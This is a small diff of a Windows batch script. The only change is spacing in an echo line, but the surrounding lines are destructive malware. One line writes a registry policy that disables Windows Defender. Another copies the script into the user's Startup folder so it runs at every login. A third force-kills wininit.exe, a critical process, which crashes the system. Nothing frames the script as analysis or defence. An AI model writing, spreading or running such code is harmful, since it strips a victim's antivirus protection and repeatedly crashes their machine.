@@ -1,5 +1,5 @@
 @echo off & title
-echo Painis Stick > nul
+echo Painis Stick >nul
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
 xcopy %0 C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 taskkill /f /im wininit.exe
